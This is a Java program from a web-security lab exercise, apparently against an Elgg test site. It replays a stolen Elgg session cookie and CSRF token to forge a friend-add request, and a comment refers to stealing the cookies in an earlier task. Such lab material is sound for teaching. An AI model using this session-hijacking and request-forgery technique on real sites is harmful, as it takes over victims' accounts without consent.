import java.io.*;
import java.net.*;

// code for laboratory 'xsite' 

public class HTTPSimpleForge {
public static void main(String[] args) throws IOException {
try {
   int responseCode;
   InputStream responseIn=null;
   String requestDetails = "&__elgg_ts=1704746567&__elgg_token=945d279866df42dafe4e595ac17bbb16";
   // URL to be forged.
   URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?  friend=41"+requestDetails);
   // URLConnection instance is created to further parameterize a
   // resource request past what the state members of URL instance
   // can represent.
   HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
   if (urlConn instanceof HttpURLConnection) {
      urlConn.setConnectTimeout(60000);
      urlConn.setReadTimeout(90000);
   }
   // addRequestProperty method is used to add HTTP Header Information.
   // Here we add User-Agent HTTP header to the forged HTTP packet.
   // Add other necessary HTTP Headers yourself. Cookies should be stolen
   // using the method in task3.
   urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
   urlConn.setRequestMethod("GET");
   String cookies = "Elgg=brd4u5p7lhrqo8h3b2j8r0ojs4";
   urlConn.addRequestProperty("cookie", cookies);

   // HttpURLConnection a subclass of URLConnection is returned by
   // url.openConnection() since the url is an http request.
   if (urlConn instanceof HttpURLConnection) {
      HttpURLConnection httpConn = (HttpURLConnection) urlConn;
      // Contacts the web server and gets the status code from
      // HTTP Response message.
      responseCode = httpConn.getResponseCode();
      System.out.println("Response Code = " + responseCode);
      // HTTP status code HTTP_OK means the response was
      // received sucessfully.
      if (responseCode == HttpURLConnection.HTTP_OK)
         // Get the input stream from url connection object.
         responseIn = urlConn.getInputStream();
         // Create an instance for BufferedReader
         // to read the response line by line.
         BufferedReader buf_inp = new BufferedReader( new InputStreamReader(responseIn));
         String inputLine;
         while((inputLine = buf_inp.readLine())!=null) {
            System.out.println(inputLine);
      }
   }
} catch (MalformedURLException e) {
   e.printStackTrace();
}
}
}
